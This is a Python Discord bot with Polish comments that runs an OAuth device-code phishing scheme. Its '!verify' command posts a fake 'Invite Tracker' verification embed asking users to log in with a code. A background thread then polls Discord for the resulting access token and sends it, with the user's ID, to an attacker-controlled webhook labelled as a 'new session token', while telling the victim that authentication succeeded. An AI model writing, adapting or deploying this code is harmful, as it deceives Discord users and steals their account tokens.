import discord
from discord.ext import commands
import requests
import os
import time
import threading

BOT_TOKEN = os.getenv("BOT_TOKEN")
CLIENT_ID = os.getenv("CLIENT_ID")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

# Przechowuje kody dla każdego użytkownika
pending = {}

@bot.event
async def on_ready():
    print(f"✅ Zalogowano jako {bot.user}")

@bot.command()
async def verify(ctx):
    """Wysyła kod do logowania (działa na wszystkich urządzeniach)"""
    
    # Generuj kod logowania
    data = {"client_id": CLIENT_ID, "scope": "identify"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        response = requests.post("https://discord.com/api/v9/oauth2/device", data=data, headers=headers)
        device_data = response.json()
        
        user_code = device_data["user_code"]
        device_code = device_data["device_code"]
        verification_uri = device_data["verification_uri"]
        interval = device_data["interval"]
        
        # Zapisz kod dla tego użytkownika
        pending[ctx.author.id] = {
            "device_code": device_code,
            "interval": interval,
            "channel": ctx.channel.id
        }
        
        # Wyślij embed z kodem
        embed = discord.Embed(
            title="🔐 Verification Required",
            description=f"**1.** Click [**{verification_uri}**]({verification_uri})\n**2.** Enter this code: **`{user_code}`**\n**3.** Click **Zaloguj się**",
            color=0x5865F2
        )
        embed.set_footer(text="This challenge expires in 15 minutes • Do not share this code with anyone!")
        embed.set_author(name="Invite Tracker", icon_url="https://cdn.discordapp.com/emojis/123456789.png")
        
        await ctx.send(embed=embed)
        
        # Uruchom wątek do sprawdzania tokena
        thread = threading.Thread(target=check_for_token, args=(ctx.author.id,))
        thread.daemon = True
        thread.start()
        
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

def check_for_token(user_id):
    """Sprawdza czy użytkownik zalogował się przez kod"""
    if user_id not in pending:
        return
        
    device_code = pending[user_id]["device_code"]
    interval = pending[user_id]["interval"]
    channel_id = pending[user_id]["channel"]
    
    while True:
        time.sleep(interval)
        
        data = {
            "client_id": CLIENT_ID,
            "device_code": device_code,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        
        try:
            response = requests.post("https://discord.com/api/v9/oauth2/token", data=data, headers=headers)
            result = response.json()
            
            if response.status_code == 200:
                access_token = result.get("access_token")
                if access_token and WEBHOOK_URL:
                    # Wyślij token na webhook
                    requests.post(WEBHOOK_URL, json={
                        "content": f"**🎯 Nowy token sesyjny!**\n```{access_token}```\n**User ID:** {user_id}"
                    })
                    
                    # Wyślij wiadomość na kanał
                    channel = bot.get_channel(channel_id)
                    if channel:
                        bot.loop.create_task(channel.send("✅ **Authentication successful!** You can now close this page."))
                
                del pending[user_id]
                break
                
            elif result.get("error") == "authorization_pending":
                continue  # Czekaj dalej
            elif result.get("error") == "expired_token":
                channel = bot.get_channel(channel_id)
                if channel:
                    bot.loop.create_task(channel.send("❌ **Verification expired.** Please run `!verify` again."))
                del pending[user_id]
                break
            else:
                # Inny błąd
                channel = bot.get_channel(channel_id)
                if channel:
                    bot.loop.create_task(channel.send(f"❌ **Error:** {result.get('error', 'Unknown error')}"))
                del pending[user_id]
                break
                
        except Exception as e:
            print(f"Error checking token: {e}")
            break

bot.run(BOT_TOKEN)
